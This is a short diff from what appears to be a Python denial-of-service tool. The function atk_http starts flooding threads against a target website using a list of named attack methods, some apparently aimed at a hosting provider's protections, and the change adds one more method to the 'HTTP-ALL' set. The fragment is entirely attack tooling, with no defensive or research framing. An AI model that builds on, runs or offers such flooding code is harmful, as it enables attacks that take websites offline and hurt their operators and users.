@@ -129,7 +129,7 @@ def atk_http(WEBSITE,NUM,NUM2,METHODS,KEYS):
    for m2 in meth:
     threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
   elif METHODS == 'HTTP-ALL':
-   meth = ['HTTP-19','HTTP-26','HTTP-41','HTTP-84','HTTP-HEX','OVH-RPS','OVH-CONNECT','PPS','HTTP-LETTER']
+   meth = ['HTTP-19','HTTP-26','HTTP-41','HTTP-84','HTTP-HEX','OVH-RPS','OVH-CONNECT','PPS','HTTP-LETTER','HTTP-RAP']
    for m2 in meth:
     threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
   elif METHODS == 'HTTP-OHIO':
